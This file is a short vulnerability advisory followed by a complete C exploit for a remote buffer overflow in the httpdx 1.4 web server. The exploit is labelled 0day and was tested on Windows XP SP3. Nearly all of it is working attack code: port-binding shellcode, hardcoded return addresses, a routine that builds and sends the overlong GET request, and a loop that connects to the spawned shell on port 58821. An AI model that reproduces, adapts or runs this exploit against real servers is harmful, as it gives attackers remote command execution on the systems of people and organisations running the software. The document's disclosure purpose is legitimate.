@@ -1,0 +1,173 @@
+httpdx web server 1.4 is vulnerable to a remote buffer overflow using long GET requests such as http://www.example.com/aaa=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+The vulnerability lies in httpdx_src/http.cpp in h_handlepeer() : strcpy(index,client->filereq);
+
+Other versions may also be vulnerable.
+
+Exploit (0day) (Tested with httpdx 1.4 on WinXP SP3)
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <error.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <string.h>
+
+/* 128 byte portbinding shellcode (for WinXP SP3) port 58821
+   Derived from shellcode written by silicon */
+unsigned char bindcode[] =
+"\x89\xE5"
+"\x83\xC4\xEC\x33\xC0\x50\x50\x50\x6A\x06"
+"\x6A\x01\x6A\x02\xB8"
+"\x6A\x8B\xAB\x71" // WSASocketA()
+"\xFF\xD0\x8B\xD8\x33\xC0\x89\x45\xF4\xB0"
+"\x02\x66\x89\x45\xF0\x66\xC7\x45\xF2\xE5"
+"\xC5\x6A\x10\x8D\x55\xF0\x52\x53\xB8"
+"\x80\x44\xAB\x71" // bind()
+"\xFF\xD0\x6A\x01\x53\xB8"
+"\xD3\x8C\xAB\x71" // listen()
+"\xFF\xD0\x33\xC0\x50\x50\x53\xB8"
+"\x40\x10\xAC\x71" // accept()
+"\xFF\xD0\x8B\xD8\xBA"
+"\x7B\xD3\x81\x7C" // SetStdHandle()
+"\x53\x6A\xF6\xFF\xD2\x53\x6A\xF5\xFF\xD2"
+"\x53\x6A\xF4\xFF\xD2\xC7\x45\xFB\x41\x63"
+"\x6D\x64\x8D\x45\xFC\x50\xB8"
+"\xC7\x93\xC2\x77" // system()
+"\xFF\xD0"
+"\x31\xC0\x50\xB8"
+"\x12\xCB\x81\x7C" // ExitProcess()
+"\xFF\xD0";
+
+
+/* ripped from TESO code */
+void shell (int sock)
+{
+        int     l;
+        char    buf[512];
+        fd_set  rfds;
+
+
+        while (1) {
+                FD_SET (0, &rfds);
+                FD_SET (sock, &rfds);
+
+                select (sock + 1, &rfds, NULL, NULL, NULL);
+                if (FD_ISSET (0, &rfds)) {
+                        l = read (0, buf, sizeof (buf));
+                        if (l <= 0) {
+                                printf("\n - Connection closed by local user\n");
+                                exit (EXIT_FAILURE);
+                        }
+                        write (sock, buf, l);
+                }
+
+                if (FD_ISSET (sock, &rfds)) {
+                        l = read (sock, buf, sizeof (buf));
+                        if (l == 0) {
+                                printf ("\n - Connection closed by remote host.\n");
+                                exit (EXIT_FAILURE);
+                        } else if (l < 0) {
+                                printf ("\n - Read failure\n");
+                                exit (EXIT_FAILURE);
+                        }
+                        write (1, buf, l);
+                }
+        }
+}
+
+
+int main(int argc, char **argv)
+{
+	char buff[1100];
+	long ret1 = 0x64f8134b;	// pop ret (core.dll)
+	long addr = 0x63b8624f;	// Required to reach ret instruction
+	long ret2 = 0x7c874413;	// jmp esp (kernel32.dll)
+	long *ptr;
+	struct sockaddr_in target;
+	int i, port, sock;
+
+
+	printf("\n---------------------------------------------------------------------\n");
+	printf("  [*] httpdx 1.4 GET Request Remote Buffer Overflow Exploit (0day) \n");
+	printf("  [*] Written and discovered by Pankaj Kohli <http://www.pank4j.com> \n");
+	printf("  [*] Tested with httpdx 1.4 on Windows XP SP3 \n\n");
+
+	if(argc < 3)
+	{
+        	printf("[-] Usage: %s  <Target IP> <Port>\n\n", argv[0]);
+        	exit(1);
+	}
+
+	port = atoi(argv[2]);
+	printf("[+] Creating payload \n");
+
+	memset(buff, 0, 1024);
+	strcpy(buff, "GET /abc=");
+        memset(buff+9, 'A', 616);
+        ptr = (long *) (buff + 625);
+        *ptr = ret1;
+        ptr++;
+        *ptr = addr;
+        ptr++;
+        *ptr = ret2;
+        ptr++;
+        *ptr = 0;
+	strcat(buff, bindcode);
+	memset(buff+765, 'A', 244);
+	buff[1009] = 0;
+	strcat(buff, " HTTP/1.1\r\nHost: 192.168.2.1\r\n\r\n");
+	
+	printf("[+] Connecting to %s on port %s \n", argv[1], argv[2]);
+	target.sin_family = AF_INET;
+	target.sin_addr.s_addr = inet_addr(argv[1]);
+	target.sin_port = htons(port);
+
+	if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+	{
+		perror("[-] Socket \n");
+		return(1);
+	}
+
+	if(connect(sock, (struct sockaddr *) &target, sizeof(target)) != 0)
+	{
+		perror("[-] Connect \n");
+		return(1);
+	}
+
+	printf("[+] Sending payload \n");
+	if (send(sock, buff, strlen(buff), 0)== -1)
+	{
+		perror("[-] Send \n");
+		return(1);
+	}
+
+	close(sock);
+	sleep(1);
+    
+	target.sin_family = AF_INET;
+	target.sin_addr.s_addr = inet_addr(argv[1]);
+	target.sin_port = htons(58821);
+
+	if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+	{
+		perror("[-] Socket \n");
+		return(1);
+	}
+    
+	if(connect(sock, (struct sockaddr *) &target, sizeof(target)) != 0)
+	{
+		printf("[-] Exploit failed. \n");
+		return(1);
+	}   
+   
+	printf("\n[+] Dropping to shell \n\n");
+	shell(sock);
+	return 0;
+}
